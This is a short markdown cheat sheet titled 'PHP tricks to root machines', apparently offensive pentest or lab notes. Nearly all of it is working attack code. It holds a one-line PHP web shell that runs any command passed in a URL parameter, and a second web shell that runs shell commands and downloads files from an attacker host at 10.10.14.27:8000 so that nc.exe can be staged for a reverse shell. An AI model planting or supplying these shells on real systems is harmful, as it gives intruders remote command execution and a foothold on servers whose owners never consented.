# PHP tricks to root machines! (file might get divided later)
#### RFI in URL payload

The following code is used to invoke commands through a url. This is done easiest by browsing to the directory
where the file is stored. For example: http://vuln.site/some/place/vuln.php?pwn=whoami. That will execute the command whoami.
A good test is to ping yourself using that command to see that it works since the exploit might be blind meaning that
you will not know if the command executed or not therefore it is smart to ping to your computer while listening to
your interface after icmp packets.
```php 
<?php echo system($_REQUEST['pwn']); ?> 
```
#### Webshell + Webupload only php

The following code is a way to create a webshell on computers without nc (Works on linux too). That shell also has extended
functionality to allow for easy uploading. Meaning you can upload nc.exe and then get a regular reverseshell.

```php
$phpCode = <<<'EOD'                                                                                                                                                                          
                                                                                                                                                                                             
<?php                                                                                                                                                                                        
 if (isset($_REQUEST['upload'])){                                                                                                                                                            
  file_put_contents($_REQUEST['upload'], file_get_contents("http://10.10.14.27:8000/" . $_REQUEST['upload']));                                                                               
};                                                                                                                                                                                           
 if (isset($_REQUEST['exec'])){                                                                                                                                                              
         echo "<pre>" . shell_exec($_REQUEST['exec']) . "</pre>";                                                                                                                            
};                                                                                                                                                                                           
?>                                                                                                                                                                                           
EOD;
```
